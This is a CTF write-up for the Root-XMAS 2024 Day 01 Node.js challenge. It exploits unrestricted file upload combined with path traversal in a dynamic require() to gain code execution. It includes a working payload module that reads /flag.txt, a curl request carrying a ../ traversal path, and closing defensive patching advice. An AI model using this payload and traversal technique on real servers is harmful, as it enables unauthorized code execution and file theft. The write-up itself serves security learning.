---
title: Root-XMAS 2024 Day 01 - Generous Santa
feed: show
permalink: /RootXMAS_2024_01
date: 01-12-2024
summary: Let's upload our gift unto santa's list!
---
### summary


A small challenge to start the advent, about unrestricted file upload accessible with an Local File Inclusion leading to an RCE on Node JS 
### recon

Santa has modernized and provided a website where you can ask for gift! And I wish for an RCE, so let's add it!

We have a nice website where we can add gifts to our sack. 
Clicking on any item doesn't seem to do anything visually, but sends a request to the server.

![[rmxmas24d01giftlist.png|those are gifts I want!]]

If we want another gift, we can suggest one by sending a name and a picture of what we want.

![[rmxmas24d01giftupload.png|upload a file, what could go wrong?]]
The code of the site is provided, so let's check the good bytes, in the `hotte.js` :

The `/api/add` endpoint imports the js module of the user chosen gift,  calls its `store` and returns its output.

```js

router.post('/add', async (req, res) => {
    const { product } = req.body;

    try {
        const Gift = require(`../models/${product.toLowerCase()}`);
        const gift = new Gift({ name: product, description: `Description of ${product}` });
        output = gift.store();
        res.json({ success: true, output: output });
    } ...
});
```

we see that the `require` call allows any path. 

```js
require(`../models/${product.toLowerCase()}`);
```

No path sanitization, no `path.basename()` , we can import any file on the file system via a Path Traversal! Perfect, if only we had an unrestricted file upload...

That the `/api/suggest` provides!
We see on the source that it's a very simple method, that allows any file type and extension, and puts it on a `/tmp/DATE/` folder.

```js
router.post('/suggest', upload.single('photo'), (req, res) => {
    const { name } = req.body;
	...
    const now = new Date();
    const dateStr = now.toISOString().split('T')[0];
    const timeStr = `${now.getHours()}-${now.getMinutes()}-${now.getSeconds()}`;
    const tempDir = path.join('/tmp', `${dateStr}_${timeStr}`);
    ...
    const tempPath = path.join(tempDir, req.file.originalname);

    fs.writeFile(tempPath, req.file.buffer, (err) => {
	...
	res.json({ message: `Thank you! Santa will consider your suggestion.`, photoPath: tempPath });
    });
});
```

Thankfully for us we have the source, and the date is by the second, so we can guess the folder name by checking the upload date, do a sandwich attack, maybe we will have to guess the timezo... 
Wait, what do you mean "the server returns the file path in the response"?  🤦

```json
{
  "message": "Thank you! Santa will consider your suggestion.",
  "photoPath": "/tmp/2024-12-01_12-28-5/payload.js"
}
```

Well... that's easier!
So now we know the code imports a file, create a `Gift` object and calls its `store` method, so let's check how these are created, with the `models/PS5.js`:

```js
const mongoose = require('mongoose');

const ps5Schema = new mongoose.Schema({
    name: { type: String, default: 'PS5' },
    description: { type: String, default: 'The PlayStation 5, the latest video game console from Sony.' }
});

ps5Schema.methods.store = function() {
    console.log('PS5 stored in the sack.');
    return this;
};

module.exports = mongoose.model('PS5', ps5Schema);
```

All other gifts follow the same model. 
There is absolutely no reason right now to create customs modules for each gift, as the `store` method is the same for each one (except the hardcoded gift name, of course). It could have just been a JSON.

We also see in the `Dockerfile` that the flag is at the root of the filesystem.

```Dockerfile
COPY flag.txt /flag.txt
```

### solution

We could just upload a JS file that directly creates a reverse shell or sends a fetch request to our server.
But let's do things right, and create a custom model which will return the `/flag.txt` file.

`payload.js`
```js
const mongoose = require('/usr/app/node_modules/mongoose');
const fs = require('fs');

data = ""
try {
    data = fs.readFileSync('/flag.txt', 'utf8');
} catch (err) {
    console.error(err);
}

flagSchema = new mongoose.Schema();

flagSchema.methods.store = function () {
    return { "flag": data }
};

module.exports = mongoose.model('Flag', flagSchema);
```

We upload the file via the web interface and retrieve the `filePath` in the Firefox devtools requests history.
Then we request our poisoined gift in our sack: 

```bash
curl --insecure -X POST -H "Content-Type: application/json" -d \
'{"product":"../../../../../../../../../../tmp/2024-12-01_11-48-39/payload"}' \
https://day1.challenges.xmas.root-me.org/api/add
```

```json
{
  "success": true,
  "output": {
    "flag": "The flag is : \n\nRM{Mayb3_S4nt4_Cl4uS_Als0_G3t_A_Flag}"
  }
}
```

### issues 

Our module is a bit different than the provided model.
#### import error 

If we do
```js
const mongoose = require('mongoose');
```
We get
```json
{"message":
"Error adding the product ... Cannot find module 'mongoose'"
}
```

As we are importing files from a file in `/tmp`, it does not find the apps libraries. 
We need to use the absolute path of the lib which is in the `node_modules` directory of the app. 
We can find the path of our app in the `Dockerfile`

```Dockerfile
WORKDIR /usr/app
...
COPY ./src/ ./
```

#### useless  schema definition

When adding items to the "sack", the description of the item defined in its module is not used, it just returns an hardcoded string.

```js
const gift = new Gift({ name: product, description: `Description of ${product}` });
```

For example if we request a tesla we get:
```json
{
    "name": "tesla",
    "description": "Description of tesla",
    "_id": "674c561425dab95f390465af"
}
```
Instead of the real description of the tesla.
So no need to put the flag in the model description, as it will not be returned in this case.

### Blue team: patching the vulns

To prevent upload of scripts, the app should only accept valid images.
Owasp has a nice [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html). To summarise:

- Do not use user provided filenames,  use a random string
	-  It prevents possible path traversals vulns and prevents attackers from guessing the file path and trying an LFI
- Do not return the file path to the user!!!
- Only allow specific files extensions (.png, .bmp)
- Check the type of your file on your server.
	- The `file` command on linux does this, as the node [file-type](https://www.npmjs.com/package/file-type) module.
- Launch a virus scan on your uploads, just to be sure, it still could be a polyglot file, or your server could be used as a malware redistribution platform. 

When dynamically importing modules:
- Don't do it. 
	- If you think you need it, you probably don't.
- Restrict the paths from which you are importing. (ex: your source dir)
- If using a user provided filename, sanitize it and prevent LFI with `path.basename()` to extract only the filename.
- Ideally, only allow files from a whitelist.